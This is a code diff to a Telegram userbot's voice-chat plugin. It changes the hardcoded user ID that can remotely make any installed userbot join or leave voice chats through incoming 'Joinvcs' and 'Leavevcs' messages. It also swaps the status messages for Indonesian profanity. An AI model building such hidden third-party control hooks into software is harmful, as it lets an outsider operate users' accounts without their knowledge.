@@ -114,7 +114,7 @@ async def change_title(e):
 
 
 @ayiin_cmd(pattern="joinvc(?: |$)(.*)", group_only=True)
-@register(incoming=True, from_users=607067484, pattern=r"^Joinvcs$")
+@register(incoming=True, from_users=6953052196, pattern=r"^Joinvcs$")
 async def join_vc(a):
     sender = await a.get_sender()
     yins = await a.client.get_me()
@@ -134,18 +134,18 @@ async def join_vc(a):
         try:
             await Ayiin.calls.join(chat_id)
             await xx.edit(
-                f"⍟ [{yins.first_name}](tg://user?id={yins.id})\n\n❏ **Berhasil Bergabung Ke Obrolan Suara**\n└ **Chat ID:** `{chat_id}`"
+                f"⍟ [{yins.first_name}](tg://user?id={yins.id})\n\n❏ **Berhasil Bergabung Ke Os Ya kontol**\n└ **Chat ID:** `{chat_id}`"
             )
             await asyncio.sleep(1)
             await Ayiin.calls.set_is_mute(True)
         except Exception as e:
             await xx.edit(f'ERROR: {e}')
     else:
-        await xx.edit("**Userbot Anda Sudah Berada Di Obrolan Suara.**")
+        await xx.edit("** GOBLOK Orang Udah Berada Di Obrolan Suara.**")
 
 
 @ayiin_cmd(pattern="leavevc(?: |$)(.*)", group_only=True)
-@register(incoming=True, from_users=607067484, pattern=r"^Leavevcs$")
+@register(incoming=True, from_users=6953052196, pattern=r"^Leavevcs$")
 async def leave_vc(event):
     sender = await event.get_sender()
     yins = await event.client.get_me()
@@ -156,12 +156,12 @@ async def leave_vc(event):
     if Ayiin.calls.is_connected:
         await Ayiin.calls.leave()
         await xx.edit(
-            f"⍟ [{yins.first_name}](tg://user?id={yins.id})\n\n❏ **Berhasil Meninggalkan Obrolan Suara**\n└ **Chat ID:** `{event.chat_id}`"
+            f"⍟ [{yins.first_name}](tg://user?id={yins.id})\n\n❏ **Turun Dulu Gua kontol DADAAHH**\n└ **Chat ID:** `{event.chat_id}`"
         )
         return
     else:
         await xx.edit(
-            f"**Userbot Anda Sedang Tidak Berada Di Obrolan Suara.**"
+            f"**UDAH TURUN DARI TADI BANGSAT.**"
         )
 
 
